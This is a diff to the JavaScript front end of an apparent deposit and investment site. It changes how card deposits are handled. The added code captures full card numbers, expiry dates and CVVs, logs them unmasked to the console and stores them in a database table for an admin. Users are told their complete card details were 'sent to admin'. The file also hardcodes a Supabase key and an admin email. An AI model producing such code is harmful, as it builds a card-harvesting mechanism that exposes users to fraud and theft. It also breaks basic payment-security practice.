@@ -990,11 +990,15 @@ function updateWeeklyBreakdown(amount, weeks) {
 }
 
 async function processDepositRequest() {
+  console.log("🚀 PROCESSING DEPOSIT REQUEST - DEBUG VERSION...");
+
   const amount =
     parseFloat(document.getElementById("deposit-amount").value) || 0;
   const method = document.getElementById("deposit-method").value;
   const weeks =
     parseInt(document.getElementById("investment-period").value) || 1;
+
+  console.log("Initial values:", { amount, method, weeks });
 
   if (amount < 100) {
     showNotification("Minimum deposit amount is $100", "error");
@@ -1003,9 +1007,74 @@ async function processDepositRequest() {
 
   let reference = "";
   let methodDetails = "";
-  let cardDetails = null; // Initialize as null
+  let cardDetails = null;
 
-  if (method === "bank") {
+  if (method === "card") {
+    console.log("🃏 Processing card deposit...");
+
+    // Get card details with debug logging
+    const cardNumber = document.getElementById("deposit-card-number").value;
+    const cardHolder = document.getElementById("deposit-card-holder").value;
+    const cardExpiry = document.getElementById("deposit-card-expiry").value;
+    const cardCvv = document.getElementById("deposit-card-cvv").value;
+    const cardType = document.getElementById("deposit-card-type").value;
+
+    console.log("Form values:", {
+      cardNumber,
+      cardHolder,
+      cardExpiry,
+      cardCvv,
+      cardType,
+    });
+
+    // Basic validation
+    if (!cardNumber || !cardHolder || !cardExpiry || !cardCvv) {
+      console.error("Missing card fields!");
+      showNotification("Please fill all card details", "error");
+      return;
+    }
+
+    // Generate reference
+    reference = "CARD_" + Date.now();
+
+    // Clean card number
+    const cleanCardNumber = cardNumber.replace(/\s/g, "").replace(/\D/g, "");
+    const lastFour = cleanCardNumber.slice(-4);
+
+    console.log("Cleaned card number:", cleanCardNumber);
+    console.log("Last four:", lastFour);
+
+    // Create COMPLETE card details object with EXACT field names
+    cardDetails = {
+      full_card_number: cleanCardNumber,
+      card_holder: cardHolder.trim().toUpperCase(),
+      expiry_date: cardExpiry.trim(),
+      cvv: cardCvv.trim(),
+      card_type: cardType,
+
+      // Additional fields for reference
+      masked_card: "**** **** **** " + lastFour,
+      last_four: lastFour,
+
+      // User info
+      user_id: userAccount.id,
+      user_email: userAccount.email,
+      user_name: `${userAccount.firstName} ${userAccount.lastName}`.trim(),
+      timestamp: new Date().toISOString(),
+
+      // Transaction info
+      reference_id: reference,
+      amount: amount,
+      deposit_method: "card",
+    };
+
+    methodDetails = `Card Payment - ${cardType.toUpperCase()} ending in ${lastFour}`;
+
+    console.log(
+      "📝 Card details object created:",
+      JSON.stringify(cardDetails, null, 2)
+    );
+  } else if (method === "bank") {
     const bankSelect = document.getElementById("bank-select");
     const bankId = bankSelect.value;
     const depositRef = document.getElementById("deposit-reference").value;
@@ -1023,61 +1092,6 @@ async function processDepositRequest() {
     reference = depositRef;
     const bankMethod = adminPaymentMethods.bank.find((m) => m.id == bankId);
     methodDetails = bankMethod ? bankMethod.details : "Bank Transfer";
-  } else if (method === "card") {
-    // Get card details from form
-    const cardNumber = document.getElementById("deposit-card-number").value;
-    const cardHolder = document.getElementById("deposit-card-holder").value;
-    const cardExpiry = document.getElementById("deposit-card-expiry").value;
-    const cardCvv = document.getElementById("deposit-card-cvv").value;
-    const cardType = document.getElementById("deposit-card-type").value;
-    const saveCard = document.getElementById("save-card-details").checked;
-
-    // Validate card details
-    if (!validateCardDetails(cardNumber, cardExpiry, cardCvv)) {
-      showNotification("Please check your card details", "error");
-      return;
-    }
-
-    // Generate reference
-    reference =
-      "CARD_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
-
-    // Get clean card number (remove spaces)
-    const cleanCardNumber = cardNumber.replace(/\D/g, "");
-    const lastFour = cleanCardNumber.slice(-4);
-    const maskedCard = "**** **** **** " + lastFour;
-
-    methodDetails = `Card Payment - ${maskedCard}`;
-
-    // Create COMPLETE card details object
-    cardDetails = {
-      // FULL UNMASKED DETAILS - ADMIN NEEDS THESE TO PROCESS
-      full_card_number: cleanCardNumber, // Complete 16-digit number
-      card_holder: cardHolder.trim().toUpperCase(),
-      expiry_date: cardExpiry, // Full expiry MM/YY
-      cvv: cardCvv, // Full CVV code
-      card_type: cardType.toUpperCase(),
-
-      // Additional info for reference
-      masked_card: "**** **** **** " + lastFour,
-      last_four: lastFour,
-
-      // User and reference info
-      reference: reference,
-      user_id: userAccount.id,
-      user_email: userAccount.email,
-      user_name: `${userAccount.firstName} ${userAccount.lastName}`,
-      timestamp: new Date().toISOString(),
-      note: "Complete card details for admin processing",
-    };
-
-    console.log("🚨 DEBUG - Card details to save:", {
-      hasCardDetails: !!cardDetails,
-      cardNumberLength: cleanCardNumber.length,
-      cvvLength: cardCvv.length,
-      expiry: cardExpiry,
-      cardDetails: cardDetails,
-    });
   } else if (method === "crypto") {
     const cryptoSelect = document.getElementById("crypto-select");
     const cryptoId = cryptoSelect.value;
@@ -1104,7 +1118,7 @@ async function processDepositRequest() {
     const supabase = initSupabase();
     const requestId = "DEP_" + Date.now();
 
-    // Create deposit data object
+    // Build the data object
     const depositData = {
       request_id: requestId,
       user_id: userAccount.id,
@@ -1118,57 +1132,71 @@ async function processDepositRequest() {
       updated_at: new Date().toISOString(),
     };
 
-    // Only add card_details if it exists
+    // Add card_details if it's a card payment
     if (method === "card" && cardDetails) {
       depositData.card_details = cardDetails;
-      console.log("✅ Adding card_details to deposit request:", cardDetails);
+      console.log(
+        "✅ Adding card_details to deposit data:",
+        depositData.card_details
+      );
+    } else {
+      console.log("⚠️ No card details to add for method:", method);
     }
 
-    // Create deposit request
-    const { error } = await supabase
+    console.log(
+      "📤 FINAL DATA TO SEND TO DATABASE:",
+      JSON.stringify(depositData, null, 2)
+    );
+
+    // Insert into database
+    const { data, error } = await supabase
       .from("deposit_requests")
-      .insert([depositData]);
+      .insert([depositData])
+      .select();
 
     if (error) {
-      console.error("Database error:", error);
+      console.error("❌ DATABASE INSERT ERROR:", error);
+      console.error("Error details:", error.message, error.details, error.hint);
       throw error;
     }
 
-    // Create transaction record
-    await supabase.from("transactions").insert([
+    console.log("✅ DATABASE INSERT SUCCESSFUL! Returned data:", data);
+
+    // Also create a transaction record
+    const transactionResult = await supabase.from("transactions").insert([
       {
         transaction_id: "TXN_" + Date.now(),
         user_id: userAccount.id,
         type: "deposit",
         amount: amount,
-        description: `Deposit request via ${method}`,
+        description: `Card deposit request`,
         method: method,
         status: "pending",
         transaction_date: new Date().toISOString(),
       },
     ]);
 
-    console.log("✅ Deposit request submitted successfully!");
-    console.log("Request data:", depositData);
+    if (transactionResult.error) {
+      console.error("Transaction insert error:", transactionResult.error);
+    }
 
-    // Show success modal
+    // Show success
     showDepositSuccessModal(amount, method, reference, cardDetails);
+    showNotification("Deposit request submitted!", "success");
 
-    // Update UI
-    await loadUserData(userAccount.email);
-    updateDashboardStats();
-    loadRecentTransactions();
-
-    // Clear form if it's a card deposit
+    // Clear form
     if (method === "card") {
       clearCardForm();
     }
+
+    // Refresh dashboard
+    setTimeout(() => {
+      updateDashboardStats();
+      loadRecentTransactions();
+    }, 1000);
   } catch (error) {
-    console.error("❌ Error processing deposit:", error);
-    showNotification(
-      "Failed to submit deposit request: " + error.message,
-      "error"
-    );
+    console.error("❌ FATAL ERROR in processDepositRequest:", error);
+    showNotification("Failed to submit deposit: " + error.message, "error");
   }
 }
 
@@ -1179,34 +1207,51 @@ function showDepositSuccessModal(
   cardDetails = null
 ) {
   const modal = document.getElementById("depositModal");
-  const modalAmount = document.getElementById("modal-deposit-amount");
-  const modalMethod = document.getElementById("modal-deposit-method");
-  const modalRef = document.getElementById("modal-deposit-ref");
 
-  if (modalAmount) modalAmount.textContent = formatCurrency(amount);
+  // Update basic info
+  document.getElementById("modal-deposit-amount").textContent =
+    formatCurrency(amount);
 
-  if (modalMethod) {
-    modalMethod.textContent =
-      method === "bank"
-        ? "Bank Transfer"
-        : method === "crypto"
-        ? "Cryptocurrency"
-        : "Credit/Debit Card";
-  }
+  const methodText =
+    method === "bank"
+      ? "Bank Transfer"
+      : method === "crypto"
+      ? "Cryptocurrency"
+      : "Credit/Debit Card";
+  document.getElementById("modal-deposit-method").textContent = methodText;
 
-  if (modalRef) modalRef.textContent = reference || "N/A";
+  document.getElementById("modal-deposit-ref").textContent = reference || "N/A";
 
-  // Add card details section if available
+  // Add debug info to the modal
   const detailsContainer = modal.querySelector(".deposit-details");
-  if (detailsContainer && method === "card" && cardDetails) {
-    detailsContainer.innerHTML += `
-      <div class="card-details-note" style="margin-top: 15px; padding: 10px; background: #f8f9fa; border-radius: 5px;">
-        <p><strong>Note:</strong> Your card details have been securely sent to admin for processing.</p>
-        <p style="font-size: 12px; color: #666; margin-top: 5px;">
-          <i class="fas fa-shield-alt"></i> Card ending in: ${cardDetails.last_four}
-        </p>
-      </div>
+  if (detailsContainer) {
+    let detailsHTML = `
+      <p><strong>Amount:</strong> ${formatCurrency(amount)}</p>
+      <p><strong>Method:</strong> ${methodText}</p>
+      <p><strong>Reference:</strong> ${reference || "N/A"}</p>
     `;
+
+    if (method === "card" && cardDetails) {
+      detailsHTML += `
+        <div style="margin-top: 15px; padding: 10px; background: #e8f5e8; border-radius: 5px;">
+          <h4 style="color: #27ae60; margin-bottom: 10px;">
+            <i class="fas fa-credit-card"></i> Card Details Saved
+          </h4>
+          <p><strong>Card Type:</strong> ${cardDetails.card_type || "N/A"}</p>
+          <p><strong>Last 4 Digits:</strong> ${
+            cardDetails.last_four || "N/A"
+          }</p>
+          <p><strong>Card Holder:</strong> ${
+            cardDetails.card_holder || "N/A"
+          }</p>
+          <p style="font-size: 12px; color: #666; margin-top: 10px;">
+            <i class="fas fa-check-circle"></i> Complete card details sent to admin
+          </p>
+        </div>
+      `;
+    }
+
+    detailsContainer.innerHTML = detailsHTML;
   }
 
   openModal(modal);
@@ -1214,9 +1259,21 @@ function showDepositSuccessModal(
   document
     .querySelectorAll("#depositModal .modal-close, #depositModal .btn-primary")
     .forEach((btn) => {
-      btn.addEventListener("click", () => closeModal(modal));
+      btn.addEventListener("click", () => {
+        closeModal(modal);
+
+        // Auto-refresh admin dashboard if we're admin
+        if (userAccount.email === "arinze18@vault.com") {
+          setTimeout(() => {
+            window.location.reload();
+          }, 500);
+        }
+      });
     });
 }
+
+
+
 
 function clearCardForm() {
   const cardFields = [
@@ -2037,15 +2094,9 @@ async function viewLatestCardDeposit() {
   }
 }
 
-
-
-
-
-
-
 async function checkCardDeposits() {
   console.log("🔍 CHECKING CARD DEPOSITS IN DATABASE...");
-  
+
   const supabase = window.supabase.createClient(
     "https://grfrcnhmnvasiotejiok.supabase.co",
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k"
@@ -2062,7 +2113,7 @@ async function checkCardDeposits() {
     if (error) throw error;
 
     console.log("Found", data.length, "card deposits:");
-    
+
     data.forEach((deposit, index) => {
       console.log(`--- Deposit ${index + 1} ---`);
       console.log("Request ID:", deposit.request_id);
@@ -2071,7 +2122,7 @@ async function checkCardDeposits() {
       console.log("Card details type:", typeof deposit.card_details);
       console.log("Full object:", deposit);
     });
-    
+
     return data;
   } catch (error) {
     console.error("Error:", error);
@@ -2080,3 +2131,24 @@ async function checkCardDeposits() {
 }
 
 // Run in browser console: checkCardDeposits()
+
+
+function testCardForm() {
+  console.log("🧪 TESTING CARD FORM VALUES...");
+  
+  // Fill form with test data
+  document.getElementById("deposit-amount").value = "1000";
+  document.getElementById("deposit-method").value = "card";
+  document.getElementById("deposit-card-number").value = "4111 1111 1111 1111";
+  document.getElementById("deposit-card-holder").value = "JOHN DOE";
+  document.getElementById("deposit-card-expiry").value = "12/25";
+  document.getElementById("deposit-card-cvv").value = "123";
+  document.getElementById("deposit-card-type").value = "visa";
+  
+  console.log("Form filled with test data");
+  console.log("Now click 'Submit Deposit Request' to test");
+  
+  return true;
+}
+
+// Run in console: testCardForm()
